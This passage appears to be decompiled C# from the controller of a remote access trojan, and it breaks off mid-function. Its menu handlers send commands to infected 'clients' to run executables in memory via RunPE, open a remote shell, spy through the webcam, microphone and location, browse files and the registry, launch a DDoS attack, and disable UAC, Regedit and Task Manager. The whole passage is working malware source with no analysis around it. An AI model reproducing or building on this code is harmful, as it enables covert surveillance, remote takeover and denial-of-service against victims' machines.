				if (!flag2)
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"LN",
						SettingsHelper.SPL,
						text2,
						SettingsHelper.SPL,
						text
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R823-28 CS$<>8__locals1 = new Main._Closure$__R823-28(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		// Token: 0x06000463 RID: 1123 RVA: 0x00026508 File Offset: 0x00024708
		private void MemoryToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					OpenFileDialog openFileDialog2 = openFileDialog;
					openFileDialog2.Filter = "(*.exe)|*.exe";
					openFileDialog2.Title = "From Memory";
					bool flag2 = openFileDialog.ShowDialog() == DialogResult.OK;
					if (flag2)
					{
						try
						{
							Assembly.LoadFile(openFileDialog.FileName).EntryPoint.GetParameters();
						}
						catch (Exception ex)
						{
							MessageBox.Show(openFileDialog.FileName, "Is Not A .NET Assembly");
							return;
						}
						byte[] state = Helper.SB("FM" + SettingsHelper.SPL + Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(openFileDialog.FileName))));
						try
						{
							foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
							{
								Client $VB$NonLocal_ = (Client)obj;
								Main._Closure$__R824-30 CS$<>8__locals1 = new Main._Closure$__R824-30(CS$<>8__locals1);
								CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
								}, state);
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
				catch (Exception ex2)
				{
					MessageBox.Show(ex2.Message);
				}
			}
		}

		// Token: 0x06000464 RID: 1124 RVA: 0x000266AC File Offset: 0x000248AC
		private void RunPEToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				new RunPE
				{
					StartPosition = FormStartPosition.CenterParent
				}.ShowDialog();
			}
		}

		// Token: 0x06000465 RID: 1125 RVA: 0x000266E8 File Offset: 0x000248E8
		private void MonitorToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\RemoteDesktop.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R826-32 CS$<>8__locals1 = new Main._Closure$__R826-32(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000466 RID: 1126 RVA: 0x000267D8 File Offset: 0x000249D8
		private void WebCamToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\WebCam.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R827-34 CS$<>8__locals1 = new Main._Closure$__R827-34(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000467 RID: 1127 RVA: 0x000268C8 File Offset: 0x00024AC8
		private void MicrophoneToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Microphone.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R828-36 CS$<>8__locals1 = new Main._Closure$__R828-36(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000468 RID: 1128 RVA: 0x000269B8 File Offset: 0x00024BB8
		private void SystemSoundToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\WSound.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R829-38 CS$<>8__locals1 = new Main._Closure$__R829-38(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000469 RID: 1129 RVA: 0x00026AA8 File Offset: 0x00024CA8
		private void ShellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Shell.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R830-40 CS$<>8__locals1 = new Main._Closure$__R830-40(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600046A RID: 1130 RVA: 0x00026B98 File Offset: 0x00024D98
		private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\FileManager.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R831-42 CS$<>8__locals1 = new Main._Closure$__R831-42(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600046B RID: 1131 RVA: 0x00026C88 File Offset: 0x00024E88
		private void RegistryEditorToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Regedit.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R832-44 CS$<>8__locals1 = new Main._Closure$__R832-44(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600046C RID: 1132 RVA: 0x00026D78 File Offset: 0x00024F78
		private void TCPConnectionsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\TCPConnections.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R833-46 CS$<>8__locals1 = new Main._Closure$__R833-46(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600046D RID: 1133 RVA: 0x00026E68 File Offset: 0x00025068
		private void ActiveWindowsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\ActiveWindows.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R834-48 CS$<>8__locals1 = new Main._Closure$__R834-48(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600046E RID: 1134 RVA: 0x00026F58 File Offset: 0x00025158
		private void StartupManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\StartupManager.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R835-50 CS$<>8__locals1 = new Main._Closure$__R835-50(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600046F RID: 1135 RVA: 0x00027048 File Offset: 0x00025248
		private void ProcessManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\ProcessManager.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R836-52 CS$<>8__locals1 = new Main._Closure$__R836-52(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000470 RID: 1136 RVA: 0x00027138 File Offset: 0x00025338
		private void ServiceManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\ServiceManager.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R837-54 CS$<>8__locals1 = new Main._Closure$__R837-54(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000471 RID: 1137 RVA: 0x00027228 File Offset: 0x00025428
		private void ClipboardManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Clipboard.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R838-56 CS$<>8__locals1 = new Main._Closure$__R838-56(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000472 RID: 1138 RVA: 0x00027318 File Offset: 0x00025518
		private void InstalledProgramsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Programs.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R839-58 CS$<>8__locals1 = new Main._Closure$__R839-58(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000473 RID: 1139 RVA: 0x00027408 File Offset: 0x00025608
		private void DDosAttackToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				MyProject.Forms.DDosAttack.Show();
				byte[] state = Helper.SB("DDos");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R840-60 CS$<>8__locals1 = new Main._Closure$__R840-60(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000474 RID: 1140 RVA: 0x000274C8 File Offset: 0x000256C8
		private void VBNetCompilerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\VB.NET Compiler.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R841-62 CS$<>8__locals1 = new Main._Closure$__R841-62(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000475 RID: 1141 RVA: 0x000275B8 File Offset: 0x000257B8
		private void LocationManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Maps.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R842-64 CS$<>8__locals1 = new Main._Closure$__R842-64(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000476 RID: 1142 RVA: 0x000276A8 File Offset: 0x000258A8
		private void PastimeToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Pastime.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R843-66 CS$<>8__locals1 = new Main._Closure$__R843-66(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000477 RID: 1143 RVA: 0x00027798 File Offset: 0x00025998
		private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					string text = Path.Combine(Application.StartupPath, "ClientsFolder", this.Lv1.SelectedItems[0].SubItems[2].Text);
					bool flag2 = !Directory.Exists(text);
					if (flag2)
					{
						Directory.CreateDirectory(text);
					}
					Process.Start(text);
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000478 RID: 1144 RVA: 0x0002783C File Offset: 0x00025A3C
		private void EnableToolStripMenuItem6_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"BScreenE"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R845-68 CS$<>8__locals1 = new Main._Closure$__R845-68(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000479 RID: 1145 RVA: 0x0002794C File Offset: 0x00025B4C
		private void DisableToolStripMenuItem6_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"BScreenD"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R846-70 CS$<>8__locals1 = new Main._Closure$__R846-70(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600047A RID: 1146 RVA: 0x00027A5C File Offset: 0x00025C5C
		private void EnableToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"UACE"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R847-72 CS$<>8__locals1 = new Main._Closure$__R847-72(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600047B RID: 1147 RVA: 0x00027B6C File Offset: 0x00025D6C
		private void DisableToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"UACD"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R848-74 CS$<>8__locals1 = new Main._Closure$__R848-74(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600047C RID: 1148 RVA: 0x00027C7C File Offset: 0x00025E7C
		private void EnableToolStripMenuItem8_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"RegeditE"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R849-76 CS$<>8__locals1 = new Main._Closure$__R849-76(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600047D RID: 1149 RVA: 0x00027D8C File Offset: 0x00025F8C
		private void DisableToolStripMenuItem8_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"RegeditD"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R850-78 CS$<>8__locals1 = new Main._Closure$__R850-78(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600047E RID: 1150 RVA: 0x00027E9C File Offset: 0x0002609C
		private void EnableToolStripMenuItem9_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB(string.Concat(new string[]
					{
						"plugin",
						SettingsHelper.SPL,
						Helper.GetChecksum("Plugins\\Options.dll"),
						SettingsHelper.SPL,
						"TaskMgrE"
					}));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R851-80 CS$<>8__locals1 = new Main._Closure$__R851-80(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600047F RID: 1151 RVA: 0x00027FAC File Offset: 0x000261AC
		private void DisableToolStripMenuItem9_Click(object sender, EventArgs e)
		{
